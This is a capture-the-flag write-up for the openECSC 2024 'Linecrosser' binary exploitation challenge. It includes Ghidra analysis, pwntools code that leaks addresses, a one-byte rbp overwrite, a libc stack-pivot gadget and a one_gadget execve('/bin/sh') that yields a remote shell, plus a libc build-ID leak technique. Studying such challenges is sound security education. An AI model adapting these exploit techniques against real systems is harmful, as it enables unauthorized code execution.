# openECSC 2024 (Round 1) - Linecrosser Writeup

While there are [official write-ups](https://github.com/ECSC2024/openECSC-2024/tree/main/round-1)
for all the challenges, I've decided to post this one, as my solution seems to
have a more robust exploit, as well as explains a little more of what's under
the hood, better serving educational purposes.

Tools used:

* [Ghidra](https://github.com/NationalSecurityAgency/ghidra);
* `gdb` with [pwndbg](https://github.com/pwndbg/pwndbg);
* [pwntools](https://github.com/Gallopsled/pwntools);
* [ROPgadget](https://github.com/JonathanSalwan/ROPgadget);
* [one_gadget](https://github.com/david942j/one_gadget).

## Task

```text
Check out this sick game with dark humour, will you be the first one to cross the line and go too far?

nc linecrosser.challs.open.ecsc2024.it 38002

The docker image for this challenge is cybersecnatlab/challenge-jail@sha256:7bf77225063b039960f654307cf5d6f977f892ff548606357a2e8fe8067d0a88.
```

There's a [linecrosser.zip](https://github.com/ECSC2024/openECSC-2024/blob/main/round-1/pwn02/attachments/linecrosser.zip) file attached.

## Discovery

The attachment contains a binary `build/linecrosser` and a `docker-compose.yml`
to run the challenge locally in a container.

```sh
❯ file ./build/linecrosser
./build/linecrosser: ELF 64-bit LSB pie executable, x86-64, version 1 `(SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=d5477f95acb9daeba09d9d00d3d3edd691c623ec, for GNU/Linux 3.2.0, not stripped
```

Whether run locally or against remote target, we get a menu that presents the
following choices:

```sh
Welcome to Cards Against Hackers TM
Who will be the first to cross the line and `buttarla di fuori`?
1) Play
2) Create custom card
3) Show custom card
4) Exit
```

We open the binary in Ghidra, it gets decompiled to the clearly readable code,
nothing's obfuscated, there are functions corresponding to each of the challenge
menu items.

We examine format strings in `__isoc99_scanf()` and `printf()` calls, nothing
looks directly exploitable. There are `malloc()` calls that seem okay, and there
are no corresponding `free()` calls, so heap-related vulnerabilities are
presumably off the table.

Then, in `create_custom_card` we discover a `fgets()` suggestive of an issue:

```c
char local_408 [1000];

// ...

puts("Write your prompt");
pcVar2 = fgets(local_408,0x401,stdin);
// ...
```

It writes up to `1025` bytes from stdin to a stack-allocated variable, which is
guessed by Ghidra to be of length `1000` (`0x3e8`). The `24` bytes that follow,
overlap with other local variables of the `create_custom_card()`, which is
probably okay, however the `1025`-th byte ends up beyond the stack frame, and
overwrites the lower byte of the previous `rbp` belonging to `main_menu()`.

Then we discover `show_custom_card()` that doesn't perform any validation of the
supplied indexes, so we can read wherever the valid pointers found in memory
point to, as long as we can compute the necessary location relative to where
custom cards are stored. (_Given that we can also write arbitrary values to the
memory using `create_custom_card()`, these two primitives allow us reading any
given memory address, but as we discover below, we won't need this for now_).

## Implementation

We fire up `gdb` (with `pwndbg`) to verify our discoveries, and wrap it up into
Python code along the way:

First, just the wrappers around the menu:

```python
from pwn import *

class Challenge:
    def __init__(self, remote_host):
        self.remote_host = remote_host

    def connect(self):
        self.io = remote(self.remote_host, 38002)
        self.io.recvuntil(b'Welcome to Cards Against Hackers TM\n')

    def disconnect(self):
        self.io.close()

    def create_custom_card_answer(self, answer: bytes):
        self.io.sendlineafter(b'Exit\n', b'2')
        self.io.sendlineafter(b'(2)?\n', b'1') 
        self.io.sendlineafter(b'Write your answer\n', answer)

    def create_custom_card_prompt(self, prompt: bytes, completions: int):
        self.io.sendlineafter(b'Exit\n', b'2') 
        self.io.sendlineafter(b'(2)?\n', b'2') 
        self.io.sendlineafter(b'Write your prompt\n', prompt)
        self.io.sendlineafter(b'How many completions?\n', str(completions).encode())

    def show_custom_card_answer(self, index: int) -> bytes | None:
        self.io.sendlineafter(b'Exit\n', b'3')
        self.io.sendlineafter(b'(2)?\n', b'1')
        self.io.sendlineafter(b'one?\n', str(index).encode())
        self.io.recvuntil(b'Answer: \'')
        data = self.io.recvuntil(b'\'\n1) Play\n', drop=True)
        if data == b'(null)':
            data = None
        return data

    def show_custom_card_prompt(self, index: int) -> tuple | None:
        self.io.sendlineafter(b'Exit\n', b'3')
        self.io.sendlineafter(b'(2)?\n', b'2')
        self.io.sendlineafter(b'one?\n', str(index).encode())
        self.io.recvuntil(b'Prompt (')
        int1 = int(self.io.recvuntil(b' completions): \'', drop=True), 10)
        data0 = self.io.recvuntil(b'\'\n1) Play\n', drop=True)
        if data0 == b'(null)':
            data0 = None
        return data0, int1
```

By inspecting the memory in `pwndbg`, we find offsets of an interest:

```python
# <main>
self.show_custom_card_prompt(33)

# <__libc_start_main+128 (+0x80)>
self.show_custom_card_prompt(42)

# [answers]
self.show_custom_card_prompt(-3)
```

Not everything is directly readable this way. Values that are invalid pointers
always crash `show_custom_card_answer()`, as it expects a `char*`. The
`show_custom_card_prompt()` is a bit different: as prompts are laid out in
memory as pairs of [`char*`, `unsigned long long`], only when a value at some
address `0x...0` is valid pointer, an arbitrary value at the address `0x...8`
can be leaked as an integer.

As we've already leaked both application and `libc` addresses, for now it's
enough to hook up the ELFs into our code.

The corresponding `libc.so.6` we copy from the challenge docker image:

```bash
docker create --name=linecrosser-tmp 'cybersecnatlab/challenge-jail@sha256:7bf77225063b039960f654307cf5d6f977f892ff548606357a2e8fe8067d0a88'
docker cp linecrosser-tmp:/lib/x86_64-linux-gnu/libc.so.6 .
```

Now we can add the following setup steps:

```python
    ...

    def __init__(self, remote_host, elf_path='./build/linecrosser', libc_path='./libc.so.6'):
        ...
        self.elf_path = elf_path
        self.libc_path = libc_path

    def connect(self):
      ...
      self.elf = ELF(self.elf_path)
      self.libc = ELF(self.libc_path)

    def setup_elf_and_libc(self):
        _, address = self.show_custom_card_prompt(33)
        self.elf.address = address - self.elf.sym['main']
        _, address = self.show_custom_card_prompt(42)
        self.libc.address = address - (self.libc.sym['__libc_start_main'] + 0x80)

    def setup_stack_addresses(self):
        _, self.addr_stack_answers = self.show_custom_card_prompt(-3)
        self.addr_stack_prompts = self.addr_stack_answers - 0x100
```

Okay, now let's test exploiting the RBP lower byte overwrite:

```python
chall = Challenge(remote_host=REMOTE_HOST)
chall.connect()
chall.setup_elf_and_libc()
chall.setup_stack_addresses()
input('Pause. Attach GDB, and press Enter to continue...')
chall.create_custom_card_prompt(cyclic(1024), 0)
```

We trace the steps in `gdb`, and eventually reach the point where the zero byte
is written:

```c
In file: /root/glibc-2.35/libio/iofgets.c:60
   55      be reported for next read. */
   56   if (count == 0 || ((fp->_flags & _IO_ERR_SEEN) && errno != EAGAIN))
   57     result = NULL;
   58   else
   59     {
 ► 60       buf[count] = '\0';
```

The corresponding stack frame in `create_custom_card()` is as follows:

```yaml
                      before fgets()            after fgets()

00:0000│-410 rsp │ pointer to [prompts]     | (unchanged)
01:0008│-408     │ pointer to [answers]     | (unchanged)
02:0010│-400     │ buffer[1000] start       | aaaaaaab
03:0018│-3f8     │ ...                      | aaacaaad
... ↓
7f:03f8│-018     │ buffer[1000] end         | xaajyaaj
80:0400│-010     │ other local              | zaakbaak
81:0408|-008     | other local              | caakdaak
82:0410| 000 rbp | other local              | eaakfaak
---
       |+008     | main_loop rbp            | main_loop rbp & ~0xff
       |+010     | pointer to main_loop+217 | (unchanged)
```

As we continue process execution beyond this point, it crashes, and as we try
re-tracing the steps, we realize that due to address space randomization, the
amount by which the RBP being shifted is random: `0x00`, `0x10`, ..., `0xf0`,
each one crashing at a different point, with the varying state of stack and
registers at crash.

Let's make this reproducible by reconnecting to the remote until we get the
offset we want (it's `0x30` bytes in the example below):

```python
    ...

    def reconnect_and_resetup(self):
        self.disconnect()
        self.connect()
        self.setup_elf_and_libc()
        self.setup_stack_addresses()

    def setup_stack_addresses(self):
        ...
        self.addr_main_loop_rbp = self.addr_stack_prompts - 0x10
...

while not hex(chall.addr_main_loop_rbp).endswith('30'):
    chall.reconnect_and_resetup()

input('Pause. Attach GDB, and press Enter to continue...')
chall.create_custom_card_prompt(cyclic(1024), 0)

```

With that trick in place, we evaluate each of the `0x10` ... `0xf0` RBP shifts
independently, and choose one that gets us as far as possible without crashing
while being able to control as much values as possible.

This turns out to be offset `0x70`: it goes without an issue to the `4) Exit`
step, where it crashes trying to follow the return address at the offset `968`
of the cyclic payload we supplied, while `rbp` at that point has the value from
the offset `960` of the cyclic payload.

Now we need somewhere useful to return to. As we examine gadgets available in
the challenge binary itself, there's completely nothing of interest. So it's
gotta be `libc` then.

A straightforward ROP chain with `execve()`, a `/bin/sh` string, and arguments
in registers happens not to fit into the available space, parts of it being
overwritten along the way.

Maybe `one_gadget` then?

```ruby
❯ one_gadget libc.so.6 
0xebcf1 execve("/bin/sh", r10, [rbp-0x70])
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL || r10 is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp

0xebcf5 execve("/bin/sh", r10, rdx)
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL || r10 is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp

0xebcf8 execve("/bin/sh", rsi, rdx)
constraints:
  address rbp-0x78 is writable
  [rsi] == NULL || rsi == NULL || rsi is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp

0xebd52 execve("/bin/sh", rbp-0x50, r12)
constraints:
  address rbp-0x48 is writable
  r13 == NULL || {"/bin/sh", r13, NULL} is a valid argv
  [r12] == NULL || r12 == NULL || r12 is a valid envp

0xebda8 execve("/bin/sh", rbp-0x50, [rbp-0x70])
constraints:
  address rbp-0x48 is writable
  r12 == NULL || {"/bin/sh", r12, NULL} is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp

0xebdaf execve("/bin/sh", rbp-0x50, [rbp-0x70])
constraints:
  address rbp-0x48 is writable
  rax == NULL || {rax, r12, NULL} is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp

0xebdb3 execve("/bin/sh", rbp-0x50, [rbp-0x70])
constraints:
  address rbp-0x50 is writable
  rax == NULL || {rax, [rbp-0x48], NULL} is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp
```

Even though the list long enough, there's none where constraints are met.

So, apparently, we need to perform some stack pivoting, to have enough space to
setup everything before we can drop into shell. Namely, we need to decrease `rsp`
value enough so it points to somewhere within the cyclic pattern we control,
while we can take advantage of being able to supply the `rbp` value.

We use `ROPgadget`, filter out what's definitely won't help, and it produces
only a 100 lines of potentially useful output. As we scroll through it, there's
a gadget that immediately draws attention, as it directly sets `rsp = [rbp - 0x10]`:

```sh
❯ ROPgadget --binary remote-libc.so.6 | grep -F rsp | grep -F rbp | grep -v -F "jmp 0x" | grep -v -F "add rsp"
...
0x00000000000e91d3 : lea rsp, [rbp - 0x10] ; pop r12 ; pop r13 ; pop rbp ; ret
...
```

Coincidentally, after overwriting the `rsp` to somewhere we control, it also
populates `r12`, `r13`, and `rbp`, which is the perfect setup for one of the
above gadgets:

```ruby
0xebd52 execve("/bin/sh", rbp-0x50, r12)
constraints:
  address rbp-0x48 is writable
  r13 == NULL || {"/bin/sh", r13, NULL} is a valid argv
  [r12] == NULL || r12 == NULL || r12 is a valid envp
```

Let's build the payload:

```python
...

context.clear(arch='amd64')

...

# this one requires `binutils` installed; otherwise, hardcode offset 0xe91d3
gadget0 = next(chall.libc.search(
    asm('lea rsp, [rbp - 0x10] ; pop r12 ; pop r13 ; pop rbp ; ret'),
    executable=True
))
gadget1 = chall.libc.address + 0xebd52
addr_buffer = chall.addr_stack_prompts - 0x440
payload = flat({
    # A gadget for stack pivoting
    # cyclic: raajsaaj
    968: p64(gadget0),

    # RBP: gadget0 sets RSP=[RBP-0x10], so the below points RSP to the
    # beginning of the stack buffer where the cyclic pattern is.
    # cyclic: paajqaaj
    960: p64(addr_buffer + 0x10),

    # values set by gadget0 to invoke gadget1 
    0: [
        # r12: cyclic: aaaabaaa
        p64(0),
        # r13: cyclic: caaadaaa
        p64(0),
        # rbp: cyclic: eaaafaaa
        p64(chall.addr_stack_prompts), # just something writable
        # ret: cyclic: gaaahaaa
        p64(gadget1),
    ],
}, length=1024)

chall.create_custom_card_prompt(payload, 0)
chall.io.sendlineafter(b'Exit\n', b'4')
chall.io.interactive()
chall.io.close()
```

It works!

```sh
[*] Switching to interactive mode
$ cat flag
openECSC{d0_y0u_l1k3_pr0b4b1listic_st4ck_p1v0t1ng?_961e1e1c}
```

Complete exploit: [pwn02-linecrosser-exploit.py](./pwn02-linecrosser-exploit.py).

## Bonus Content

### Identifying remote libc

If it was the case, that the remote challenge uses a different version of `libc`
we'd still be able to extract the necessary information to attack it. Namely, we
do this by writing an address to be leaked using `create_custom_card_prompt()`,
and then dereferencing it via `show_custom_card_answer()` (an index for it is
obtained through a straightforward calculation):

```python
    ...
    def connect(self):
        ...
        self._prompt_counter = 0

    def leak_via_answer_by_addr(self, addr):
        index = (addr - self.addr_stack_answers) // 8
        return self.show_custom_card_answer(index)

    def leak_address(self, addr):
        self.create_custom_card_prompt(b'AAAAAAAA', addr)
        base = self.addr_stack_prompts + self._prompt_counter * 16
        self._prompt_counter += 1
        assert self.leak_via_answer_by_addr(base+0) == b'AAAAAAAA\n'
        return self.leak_via_answer_by_addr(base+8)

...

# .note.gnu.build-id
addr_section_build_id = chall.libc.address + 0x380
if chall.leak_address(addr_section_build_id + 0xc) == b'GNU':
    build_id = chall.leak_address(addr_section_build_id + 0x10)[:20]
    if len(build_id) < 20:
        raise NotImplementedError('Build ID is too short, probably wrong offset')
    build_id = enhex(build_id)
else:
    raise NotImplementedError('Build ID not found at the expected offset')

libc_path = libcdb.search_by_build_id(build_id, unstrip=False)
if not libc_path:
    raise NotImplementedError(f'No matching libc for build ID {build_id} found')

chall.libc_path = libc_path
chall.reconnect_and_resetup()
```

```sh
[*] Leaking Build ID of the remote libc...
[*] Using cached data from '$HOME/.cache/.pwntools-cache-3.10/libcdb/build_id/69389d485a9793dbe873f0ea2c93e02efaa9aa3d'
[+] Found a matching libc.
[*] Closed connection to linecrosser.challs.open.ecsc2024.it port 38002
[+] Opening connection to linecrosser.challs.open.ecsc2024.it on port 38002: Done
...
```

While there's [dynelf](https://docs.pwntools.com/en/stable/dynelf.html) in
`pwntools` that provides automation designed to serve this purpose, we can't use
it (namely, the `dynelf.DynELF.libc`) to perform all that
auto-magically, as it requires too many leaks (and we're explicitly limited by
`20` total operations within the `main_loop()`). Neither can we use
`libcdb.get_build_id_offsets()` as a source of offsets for the
`.note.gnu.build-id` section, instead of the `0x380` hardcoded above, as this
value isn't added to the `libcdb` module as of its current version.

If we add another level of complexity, and assume that a libc for the given
BuildID can not be found, we still can directly read and `disasm()` its code using
the same machinery (minding the null bytes), and walking backwards and forwards
from the offset we get from the `libc` version we currently have at hand.
